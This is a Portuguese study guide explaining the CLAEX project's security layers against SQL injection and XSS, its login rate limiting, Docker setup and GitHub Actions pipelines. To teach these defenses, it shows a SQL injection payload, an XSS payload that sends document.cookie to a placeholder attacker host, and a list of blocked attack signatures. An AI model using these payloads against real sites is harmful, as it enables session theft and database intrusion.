# Guia de Estudos CLAEX — Segurança (API Keys, SQLi, XSS, Rate Limit), Docker, Android e Deploy no GitHub

> **Autor da Arquitetura Back-End Java & IA:** Vini (`VC` — Dev #01)  
> **Objetivo deste documento:** Explicar passo a passo **o que foi feito**, **por que foi feito** e **como cada mecanismo funciona por baixo dos panos** para consultas e estudos futuros.

---

## Sumário

1. [Ocultação de API Keys e Isolamento das APIs](#1-ocultação-de-api-keys-e-isolamento-das-apis)
2. [Camada de Segurança 1 — Proteção contra SQL Injection (SQLi)](#2-camada-de-segurança-1--proteção-contra-sql-injection-sqli)
3. [Camada de Segurança 2 — Proteção contra JavaScript Injection (XSS)](#3-camada-de-segurança-2--proteção-contra-javascript-injection-xss)
4. [Camada de Segurança 3 — Limitação de Tentativas de Login e Hash de Senhas](#4-camada-de-segurança-3--limitação-de-tentativas-de-login-e-hash-de-senhas)
5. [Portabilidade para Celulares Android (PWA + Capacitor APK + React Native Expo)](#5-portabilidade-para-celulares-android-pwa--capacitor-apk--react-native-expo)
6. [Docker e Docker Compose Explicados Linha por Linha](#6-docker-e-docker-compose-explicados-linha-por-linha)
7. [GitHub Actions: Transformando o Repositório em App Android + Deploy Automático](#7-github-actions-transformando-o-repositório-em-app-android--deploy-automático)

---

## 1. Ocultação de API Keys e Isolamento das APIs

### O problema (Por que nunca colocar API Key no Front-End ou no GitHub?)
Qualquer arquivo HTML/JS entregue ao navegador é público: basta abrir o `DevTools (F12) -> Network/Sources` para ler o código. Além disso, qualquer chave gravada diretamente em arquivos `.java`, `.py` ou `application.properties` enviados ao GitHub fica registrada no histórico do Git e pode ser varrida por bots em segundos.

### O que foi feito no CLAEX
1. **Padrão Back-End Proxy (BFF — Backend For Frontend):**
   - O front-end ([`js/api.js`](../lolooo-main/src/main/resources/static/js/api.js)) **não contém nenhuma chave** e **não chama URLs externas** (`googleapis.com`, `anthropic.com`, `openai.com`).
   - Ele chama apenas rotas internas relativas da própria aplicação (`/grade/ia/analisar/{id_sala}`, `/login/entrar`, etc.).
2. **Chaves injetadas via Variáveis de Ambiente no Servidor:**
   - No Java ([`application.properties`](../lolooo-main/src/main/resources/application.properties) e [`GeminiScheduleAdvisorService.java`](../lolooo-main/src/main/java/com/claex/crud/Service/GeminiScheduleAdvisorService.java)):
     ```properties
     gemini.api.key=${GEMINI_API_KEY:}
     ```
   - A chave da API Gemini foi movida da query string (`?key=...`, que costumava aparecer em logs de proxy) para o **cabeçalho HTTP** `x-goog-api-key`.
   - As credenciais do banco ([`DatabaseConfig.java`](../lolooo-main/src/main/java/com/claex/crud/config/DatabaseConfig.java)) e o segredo de sessão ([`backend_python/main.py`](../backend_python/main.py)) também vêm de `DB_URL`, `DB_USERNAME`, `DB_PASSWORD` e `SECRET_KEY`.
3. **Senhas fora da URL e fora das respostas JSON:**
   - Antes, login e cadastro enviavam `?senha=...` na URL e o endpoint `/form_cadastro-html/listar` devolvia o campo `senha` no JSON.
   - Agora:
     - `js/api.js` envia `login` e `senha` no **corpo** da requisição (`Content-Type: application/x-www-form-urlencoded`).
     - Nas entidades Java ([`CadastroEntity.java`](../lolooo-main/src/main/java/com/claex/crud/Entity/CadastroEntity.java) e [`ProfessorEntity.java`](../lolooo-main/src/main/java/com/claex/crud/Entity/ProfessorEntity.java)), o campo senha recebeu `@JsonProperty(access = JsonProperty.Access.WRITE_ONLY)` — o Jackson aceita na entrada, mas **jamais serializa na saída**.
4. **Proteção do Repositório ([`.gitignore`](../.gitignore) e [`.env.example`](../.env.example)):**
   - `.env`, `.env.*`, `*.keystore`, `*.jks`, `*.p12` e `*.pem` estão bloqueados no `.gitignore`.
   - O repositório traz apenas o [`.env.example`](../.env.example) com instruções de preenchimento.

---

## 2. Camada de Segurança 1 — Proteção contra SQL Injection (SQLi)

### Como funciona um ataque de SQL Injection?
Quando um sistema monta SQL concatenando strings:
```sql
-- VULNERÁVEL (NUNCA FAZER):
"SELECT * FROM tbl_cadastro WHERE email = '" + login + "'"
```
Se o atacante digitar `' OR '1'='1' --`, o comando vira:
```sql
SELECT * FROM tbl_cadastro WHERE email = '' OR '1'='1' --'
```
Como `'1'='1'` é sempre verdadeiro, o banco devolve a primeira linha da tabela (geralmente o administrador) sem precisar saber a senha.

### Como o CLAEX bloqueia SQL Injection (Defesa em Duas Camadas)

#### Camada 1A — Consultas Parametrizadas (Prepared Statements via JPA / SQLAlchemy)
Em todas as consultas do CLAEX ([`CadastroRepository.java`](../lolooo-main/src/main/java/com/claex/crud/Repository/CadastroRepository.java), [`AulaRepository.java`](../lolooo-main/src/main/java/com/claex/crud/Repository/AulaRepository.java), etc. e SQLAlchemy em [`backend_python/main.py`](../backend_python/main.py)), os parâmetros são enviados **separados** da árvore sintática do SQL:
```java
@Query("SELECT p FROM ProfessorEntity p WHERE LOWER(p.email_professor) = LOWER(:email)")
Optional<ProfessorEntity> findByEmailProfessorIgnoreCase(@Param("email") String email);
```
O driver JDBC / SQLite compila primeiro a estrutura do `SELECT` com um marcador `?` e depois envia o valor de `:email` como **literal de texto puro**. Mesmo que o usuário envie `' OR 1=1 --`, o banco procura literalmente um e-mail igual a `' OR 1=1 --`, tornando a injeção matematicamente impossível.

#### Camada 1B — Filtro WAF de Inspeção na Entrada + Validação por Lista Branca
Para barrar ataques logo na borda e registrar tentativas no log:
- **No Java:** [`InputSanitizationFilter.java`](../lolooo-main/src/main/java/com/claex/crud/security/InputSanitizationFilter.java) + [`InputThreatDetector.java`](../lolooo-main/src/main/java/com/claex/crud/security/InputThreatDetector.java).
- **No Python:** `SecurityMiddleware` + `detectar_ameaca()` em [`backend_python/security.py`](../backend_python/security.py).
- O filtro inspeciona **todos os parâmetros de query/formulário e o corpo JSON** antes do controller rodar. Se detectar assinaturas como `UNION SELECT`, `' OR 1=1`, `'--`, `; DROP/DELETE/UPDATE`, `SLEEP()`, `BENCHMARK()` ou `information_schema`, responde imediatamente **`HTTP 400 Bad Request`**.
- Além disso, o cadastro aplica **lista branca (allowlist)** para nomes (`^[\p{L}\p{N} .'\-]{2,120}$`), e-mails e perfis (`aluno`, `professor`, `administrador`).

---

## 3. Camada de Segurança 2 — Proteção contra JavaScript Injection (XSS)

### Como funciona um ataque de JavaScript Injection (Cross-Site Scripting / XSS)?
Se um usuário cadastrar como nome `<img src=x onerror="fetch('https://atacante.com/?c='+document.cookie)">` e o sistema inserir esse nome direto em `elemento.innerHTML`, o navegador executa o JavaScript do atacante dentro da sessão de quem abrir a página.

### Como o CLAEX bloqueia XSS (Defesa em Quatro Camadas)

1. **Bloqueio de payloads na entrada (Server-Side WAF):**
   - [`InputThreatDetector.java`](../lolooo-main/src/main/java/com/claex/crud/security/InputThreatDetector.java) e [`backend_python/security.py`](../backend_python/security.py) rejeitam com `HTTP 400` qualquer requisição contendo tags perigosas (`<script>`, `<iframe>`, `<svg>`, `<object>`, `<img>`), pseudo-protocolos (`javascript:`, `vbscript:`, `data:text/html`) ou atributos de evento (`onerror=`, `onload=`, `onclick=`).
2. **Escape de HTML na saída (Front-End Output Encoding):**
   - Em [`js/api.js`](../lolooo-main/src/main/resources/static/js/api.js), a função `window.API.escapeHtml(str)` converte `& < > " '` em entidades HTML inofensivas (`&amp; &lt; &gt; &quot; &#39;`).
   - Todas as telas que montam linhas dinâmicas (`tabela_cadastros.html`, `listar_sala.html`, `form_nova_sala.html`, `painel_professor.html`, `grade.html`) passam os dados vindos do banco por `escapeHtml()`. Assim, `<script>` é desenhado como texto na tela e nunca interpretado como tag HTML.
3. **Cabeçalho `Content-Security-Policy` (CSP) e Headers de Segurança:**
   - Configurados em [`SecurityConfig.java`](../lolooo-main/src/main/java/com/claex/crud/config/SecurityConfig.java) e [`backend_python/security.py`](../backend_python/security.py):
     - `Content-Security-Policy`: restringe de onde scripts, estilos, fontes e conexões (`connect-src 'self'`) podem ser carregados e proíbe `<object>` e `<iframe>` externos (`frame-ancestors 'none'`).
     - `X-Content-Type-Options: nosniff`: impede o navegador de executar um arquivo de texto como se fosse JavaScript.
     - `X-Frame-Options: DENY`: impede clickjacking.
     - `Referrer-Policy: strict-origin-when-cross-origin` e `Permissions-Policy: camera=(), microphone=(), geolocation=()`.
4. **Cookies `HttpOnly` + `SameSite=Lax`:**
   - Mesmo que algum script externo rodasse na página, `document.cookie` não consegue ler o cookie de sessão quando a flag `HttpOnly` está ativa.

---

## 4. Camada de Segurança 3 — Limitação de Tentativas de Login e Hash de Senhas

### Como funciona o bloqueio contra Força-Bruta (Rate Limiting)?
Implementado em [`LoginAttemptService.java`](../lolooo-main/src/main/java/com/claex/crud/security/LoginAttemptService.java) (Java) e `LoginAttemptLimiter` em [`backend_python/security.py`](../backend_python/security.py) (Python):

```
[Cliente envia POST /login/entrar]
        │
        ▼
Está bloqueado (IP+login ou IP global)?
   ├── SIM ──► Retorna HTTP 429 Too Many Requests + Header "Retry-After: 900"
   │
   └── NÃO ──► Verifica usuário + hash da senha (BCrypt / PBKDF2)
                 ├── ERROU ──► Incrementa contador de falhas
                 │             • Se atingiu 5 falhas em 15 min -> bloqueia por 15 min
                 │             • Retorna HTTP 401 + {"tentativasRestantes": N}
                 └── ACERTOU ► Zera contador + rotaciona ID da sessão
```

- **Por que dois contadores (`porUsuario` e `porIp`)?**
  - `porUsuario` (`IP + login`, limite padrão: **5 tentativas**): impede adivinhar a senha de um usuário específico.
  - `porIp` (`IP`, limite padrão: **20 tentativas**): impede *credential stuffing* (testar 1 tentativa em 500 usuários diferentes a partir do mesmo IP).
- **Por que a mensagem de erro é sempre `"Usuário ou senha inválidos."`?**
  - Para impedir **enumeração de usuários** (um atacante não descobre quais e-mails estão cadastrados no banco).

### Como funciona o Hash de Senhas (BCrypt / PBKDF2)?
- **Hash ≠ Criptografia:** criptografia tem chave para descriptografar; **hash é mão única**.
- No Java ([`PasswordService.java`](../lolooo-main/src/main/java/com/claex/crud/security/PasswordService.java)) usamos **BCrypt com custo 12** (`$2a$12$...`). No Python ([`security.py`](../backend_python/security.py)) usamos **PBKDF2-HMAC-SHA256 com 310.000 iterações** e *salt* aleatório de 16 bytes.
- **O que é o *Salt*?** É um valor aleatório único misturado à senha antes do hash. Se dois usuários tiverem a mesma senha, os hashes no banco serão completamente diferentes (inutiliza *Rainbow Tables*).
- **Migração transparente:** se o banco local tinha uma conta antiga com senha em texto puro (`1234`), no primeiro login válido o sistema compara em tempo constante (`MessageDigest.isEqual` / `hmac.compare_digest`) e **atualiza automaticamente o registro para hash forte**.

---

## 5. Portabilidade para Celulares Android (PWA + Capacitor APK + React Native Expo)

O CLAEX oferece **3 formas complementares** de rodar no Android:

| Modalidade | Arquivos no Projeto | Como funciona |
| :--- | :--- | :--- |
| **1. PWA Instalável (Chrome Android)** | [`manifest.json`](../lolooo-main/src/main/resources/static/manifest.json), [`sw.js`](../lolooo-main/src/main/resources/static/sw.js), `img/icon-192.png`, `img/icon-512.png` | Ao abrir o site no Android, o navegador permite **"Adicionar à tela inicial / Instalar app"**. Abre em tela cheia (`display: standalone`), com barra `#0F172A` e cache offline da interface. |
| **2. APK Nativo Android (Capacitor + Gradle)** | [`capacitor.config.json`](../capacitor.config.json), [`package.json`](../package.json), [`.github/workflows/android-apk.yml`](../.github/workflows/android-apk.yml) | Empacota as 9 telas web dentro de um container Android nativo (`com.claex.app`) e compila o arquivo instalável **`CLAEX-android-debug.apk`** automaticamente no GitHub Actions. |
| **3. App React Native (Expo / Snack)** | [`mobile-snack/`](../mobile-snack/), [`mobile-snack/app.json`](../mobile-snack/app.json) | Versão 100% em componentes nativos React Native (`View`, `Text`, `ScrollView`, `TouchableOpacity`) organizada em `src/styles`, `src/data`, `src/components` e `src/screens`. |

---

## 6. Docker e Docker Compose Explicados Linha por Linha

### 6.1 O que é Docker e por que usamos?
Um **container** empacota a aplicação junto com a versão exata do Python/Java e suas bibliotecas em uma imagem imutável. Assim, o sistema roda exatamente igual no seu computador, em um servidor Linux na nuvem ou no GitHub Actions ("se funciona no Docker, funciona em qualquer lugar").

### 6.2 Anatomia do [`Dockerfile`](../Dockerfile) (FastAPI + Front-End) e [`lolooo-main/Dockerfile`](../lolooo-main/Dockerfile) (Java 17 Multi-Stage)

| Instrução | O que faz | Por que é uma boa prática |
| :--- | :--- | :--- |
| `FROM python:3.12-slim` / `FROM eclipse-temurin:17-jre-jammy` | Escolhe uma imagem base oficial enxuta. | Imagens `slim`/`jre` têm menos pacotes do sistema operacional -> imagem menor e menos vulnerabilidades (CVEs). |
| **Multi-Stage Build** (`FROM maven:... AS builder` -> `FROM eclipse-temurin:... AS runtime`) | No Java, o 1º estágio usa o Maven + JDK para compilar o `.jar`; o 2º estágio copia **apenas o `.jar`** para uma imagem que só tem o JRE. | O código-fonte e o Maven não vão para produção; a imagem final cai pela metade do tamanho. |
| `COPY requirements.txt` / `COPY pom.xml` **antes** do código | Copia primeiro a lista de dependências, instala, e só depois copia o código-fonte. | **Cache de camadas:** quando você altera uma linha de `.py`/`.java`, o Docker reaproveita a camada de pacotes já baixados e o build leva segundos. |
| `RUN useradd --uid 10001 claexuser` + `USER claexuser` | Cria e ativa um usuário comum sem poder de `root`. | Se um invasor encontrar uma brecha na aplicação, ele fica preso em um usuário sem permissão de instalar programas ou alterar o sistema do container. |
| `HEALTHCHECK CMD ...` | Testa a cada 30s se `http://127.0.0.1:8081/materias/listar` responde `200 OK`. | Permite que o Docker Compose saiba quando a API está realmente pronta e saudável. |

### 6.3 Anatomia do [`docker-compose.yml`](../docker-compose.yml)
- **`services.claex-app`**: sobe a aplicação principal na porta `8081` lendo variáveis do arquivo `.env` (`env_file`).
- **`services.mysql` + `services.claex-java` (`profiles: ["java"]`)**: quando você roda `docker compose --profile java up --build`, sobe também o MySQL 8 e aguarda o `healthcheck` do MySQL ficar verde (`condition: service_healthy`) antes de iniciar o Spring Boot na porta `8082`.
- **`volumes` (`claex_data`, `mysql_data`)**: pastas gerenciadas pelo Docker fora da camada efêmera do container, garantindo que o banco de dados não seja apagado ao reiniciar.
- **`networks` (`claex_internal`)**: rede privada entre os containers; o banco MySQL fica invisível para fora da máquina host.
- **`security_opt: [no-new-privileges:true]`**: bloqueia binários `setuid` dentro do container.

### Comandos essenciais do Docker para o dia a dia
```bash
# 1. Criar seu arquivo .env local a partir do modelo
cp .env.example .env

# 2. Construir e subir o container em segundo plano (-d)
docker compose up --build -d

# 3. Ver os logs em tempo real
docker compose logs -f

# 4. Subir também a pilha Java 17 + MySQL 8
docker compose --profile java up --build -d

# 5. Parar e remover os containers (mantendo os dados salvos nos volumes)
docker compose down
```

---

## 7. GitHub Actions: Transformando o Repositório em App Android + Deploy Automático

Criamos **3 pipelines automatizados** em [`.github/workflows/`](../.github/workflows/):

1. **[`ci-security-docker.yml`](../.github/workflows/ci-security-docker.yml) — Auditoria de Segurança + Teste da Imagem Docker:**
   - A cada `git push`, sobe o servidor no runner do GitHub e executa a suíte [`backend_python/security_test.py`](../backend_python/security_test.py) testando:
     - Bloqueio de SQL Injection (`HTTP 400`),
     - Bloqueio de JavaScript Injection / XSS (`HTTP 400`) e presença do header `Content-Security-Policy`,
     - Bloqueio após 5 tentativas erradas de login (`HTTP 429 Too Many Requests` + `Retry-After`),
     - Ausência de senhas/chaves nas respostas JSON,
     - Compilação do back-end Java 17 com Maven e build completo da imagem `Dockerfile`.
2. **[`deploy-pages.yml`](../.github/workflows/deploy-pages.yml) — Deploy Automático no GitHub Pages:**
   - Publica o front-end institucional + PWA Android (`lolooo-main/src/main/resources/static/`) diretamente no **GitHub Pages** a cada push na branch `main`.
3. **[`android-apk.yml`](../.github/workflows/android-apk.yml) — Compilador de App Android (`.apk`):**
   - Instala Node.js, Java 17 e o Android SDK no GitHub Actions, inicializa o projeto Android com **Capacitor** (`npx cap add android && npx cap sync android`), roda `./gradlew assembleDebug` e publica o arquivo **`CLAEX-android-debug.apk`** pronto para baixar na aba **Actions -> Artifacts** (e também cria uma **GitHub Release** quando você envia uma tag `v*`).
